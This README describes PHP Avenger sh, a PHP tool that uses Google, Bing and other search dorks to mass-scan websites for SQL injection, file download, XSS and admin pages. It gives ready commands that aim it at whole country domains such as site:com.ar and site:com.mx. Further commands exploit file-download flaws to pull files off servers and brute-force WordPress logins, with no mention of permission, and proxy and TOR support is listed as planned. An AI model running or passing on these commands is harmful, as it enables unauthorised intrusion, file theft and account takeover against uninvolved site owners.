# PHP Avenger

> PHP Avenger is a modern collection of open source tools written in PHP with focus in security and hacking.

### Beta

* PHP Avenger sh ( Search Engine )

### Future Implementation


* PHP Avenger bt ( Brute - Force )
* PHP Avenger sca ( State Code Analyse )
* PHP Avenger pwp ( Plugin WordPress )
* PHP Avenger cj ( Component Joomla )

***
#PHP Avenger SH

> Php Avenger sh is a open source tool with an idea **based in a fork inurlbr by Cleiton Pinheiro**. Basically **PHP Avenger sh** is a tool that automates the process of detecting possible vulnerabilities using mass scan and checking if the vulnerability is true or false. Php Avenger uses search engines like google, bing and others through dorks ( advanced search ).

## Installation

The recommended way to install PHP Avenger is through
[Composer](http://getcomposer.org).

```bash
# Install Composer
curl -sS https://getcomposer.org/installer | php
```

Next, run the Composer command to install the latest beta version of Php Avenger SH:

```bash
php composer.phar create-project aszone/avenger-sh
cd avenger-sh
```
## Basic Usage

> Use the commands bellow to init the process, results will be printed in the monitor and saved in a `.txt` file on folder `results`.

### Get trash search

```bash
php avenger sh --dork="site:com.ar ext:sql password"
```
#### Result of trash search
![alt tag](http://lenonleite.com.br/wp-content/uploads/2016/06/imagem1.png)


### Check Sql Injection
```bash
php avenger sh --dork="site:com.ar inurl:php?id=" --check="sqli"
```
#### Result of Sql Injection
![alt tag](http://lenonleite.com.br/wp-content/uploads/2016/06/imagem2.png)
![alt tag](http://lenonleite.com.br/wp-content/uploads/2016/06/imagem3.png)


### Check Local File Download
```bash
php avenger sh --dork="site:com.ar inurl:download.php?file=" --check="lfd"
```
#### Result of Local File Download
![alt tag](http://lenonleite.com.br/wp-content/uploads/2016/06/imagem7.png)

### Check and Exploited Local File Download

> This next command you will check vulnerabilities and extract files of server. The files will save in /results/exploits/lfd/

```bash
php avenger sh --dork="site:com.mx inurl:download.php?file=" --check="lfd" --exploit="lfd"
```
#### Result of Extract Files
![alt tag](http://lenonleite.com.br/wp-content/uploads/2016/11/lfdFiles.png)
#### Video of Extract Files
[![Video of extract files](https://img.youtube.com/vi/IdrpQ7KQlmU/0.jpg)](https://www.youtube.com/watch?v=IdrpQ7KQlmU)

### Check is Admin Page
```bash
php avenger sh --dork="site:com.ar inurl:admin" --check="isAdmin"
```

### Check is Admin Page and if Admin Page for WordPress get all users and start brute force
```bash
php avenger sh --dork="site:com inurl:wp-content/uploads" --check="isAdmin" --exploit="btwp"
```

### Help for commands
```bash
php avenger sh
```

## Details

#### Search Engines
* Google
* GoogleApi
* Bing
* DuckDuckGo
* Yahoo
* Yandex

#### Covered Vulnerabilities
* Sql Injection (SQLI)
* Local File Download (LFD)
* Admin Page
* Remote File Inclusion (RFI)
* Cross-Site-Scripting (XSS)

#### Covered Exploits
* Local File Download (LFD)
* Brute Force for WordPress

#### Covered Vulnerabilities in next versions
* Sensitive Files
    * Dump Files
    * Config Files
    * Open Folders

#### Features under development
* Power Search
* Send E-mail with results
* Naming the `.txt` result file
* Proxys
    * TOR
    * Site of Proxys
    * **Virgin Proxies**

## Help and docs
* [Documentation](http://phpavenger.aszone.com.br).
* [Examples](http://phpavenger.aszone.com.br/examples).
* [Videos](https://www.youtube.com/user/MrLenonleite).
* [Steakoverflow](http://phpavenger.aszone.com.br).

